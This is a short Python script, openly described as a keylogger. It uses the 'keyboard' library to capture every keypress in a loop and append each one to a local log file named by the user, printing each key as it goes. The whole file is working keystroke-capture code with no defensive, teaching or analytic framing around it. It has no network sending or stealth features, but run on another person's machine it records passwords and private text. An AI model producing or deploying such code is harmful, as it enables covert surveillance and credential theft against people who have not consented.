import keyboard
import time

def log_keystrokes(file_path):
    """
    Logs keystrokes to a file.

    Args:
        file_path (str): The path to the log file.
    """
    with open(file_path, "a") as log_file:
        print("Keylogger started. Press Ctrl+C to stop.")
        try:
            while True:
                key = keyboard.read_key()
                log_file.write(f"{key}\n")
                print(f"Logged: {key}")
                time.sleep(0.01)  # Avoid overwhelming the log file
        except KeyboardInterrupt:
            print("Keylogger stopped.")

def main():
    """
    The main function that interacts with the user.
    """
    file_path = input("Enter the log file path: ")
    log_keystrokes(file_path)

if __name__ == "__main__":
    main()